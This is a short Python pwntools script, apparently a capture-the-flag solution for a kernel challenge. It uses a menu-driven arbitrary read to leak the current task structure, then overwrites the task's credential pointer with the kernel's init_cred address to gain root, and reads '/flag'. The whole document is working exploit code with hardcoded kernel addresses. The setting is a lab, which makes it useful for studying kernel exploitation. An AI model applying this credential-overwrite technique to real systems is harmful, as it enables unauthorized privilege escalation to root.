#!/usr/bin/env python3
from pwn import *

s = process('./run.sh', shell=True)

current_task = 0xffffffff8183a040
init_cred = 0xffffffff8183f4c0

s.sendlineafter('> ', '1')
s.sendlineafter('> ', hex(current_task))
s.recvuntil('level is: ')
task = int(s.recvline(False), 0x10)

s.sendlineafter('> ', '2')
s.sendlineafter('> ', hex(task + 0x400))
s.sendlineafter('> ', hex(init_cred))

s.sendlineafter('> ', '4')
s.sendlineafter('> ', '/flag')

s.recvuntil('contents: \r\n')
print(s.recvline(False).decode('utf-8'))

s.sendlineafter('> ', '6')
